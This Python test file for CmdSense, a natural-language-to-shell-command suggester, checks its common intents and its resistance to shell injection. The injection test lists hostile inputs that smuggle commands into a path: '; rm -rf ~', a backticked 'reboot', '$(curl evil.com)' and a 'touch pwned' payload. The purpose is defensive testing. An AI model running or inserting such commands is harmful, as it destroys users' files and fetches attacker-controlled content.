"""Unit tests for CmdSense suggest intents and shell injection resistance."""

from __future__ import annotations

import shlex

import pytest

from cmdsense.intents import list_all_intents
from cmdsense.suggest import suggest_command


def test_intent_catalog_size() -> None:
    intents = list_all_intents()
    assert len(intents) >= 40, f"Expected at least 40 intent templates, got {len(intents)}"


@pytest.mark.parametrize(
    "query",
    [
        "Find all files larger than 100MB in Downloads",
        "find all py files in src",
        "files modified in last 7 days",
        "find empty folders",
        "check disk usage of ~/Desktop",
        "largest files in Downloads",
        "delete node_modules",
        "kill process on port 3000",
        "show listening ports",
        "undo last git commit",
        "git stash changes",
        "search for 'TODO' in files",
        "count lines of code",
        "compress folder to archive.tar.gz",
        "create zip of project",
        "download https://example.com/file.zip",
        "show env vars",
        "check free disk space",
        "list processes by memory",
        "list processes by cpu",
        "fix permissions in project",
        "open folder in finder",
        "copy content of file.txt to clipboard",
        "update brew",
        "clean docker",
        "create a python venv",
        "clean install node dependencies",
        "make script.sh executable",
    ],
)
def test_suggest_common_intents(query: str) -> None:
    rep = suggest_command(query)
    assert rep.is_supported
    assert rep.suggested_command is not None
    assert rep.matched_intent_id is not None
    assert rep.explanation


def test_suggest_shell_injection_resistance() -> None:
    malicious_inputs = [
        "Find all files larger than 100MB in ; rm -rf ~",
        "Find all files larger than 100MB in `reboot`",
        "Find all files larger than 100MB in $(curl evil.com)",
        "copy folder 'foo; touch pwned' to bar",
    ]
    for evil in malicious_inputs:
        rep = suggest_command(evil)
        if rep.is_supported and rep.suggested_command:
            cmd = rep.suggested_command
            # Splitting with POSIX shlex must treat the injected string as a single token,
            # never as a command or unquoted operator
            tokens = shlex.split(cmd)
            assert "rm" not in tokens or tokens[0] != "rm"
            assert "reboot" not in tokens
            assert not any(t.startswith("$(") for t in tokens)
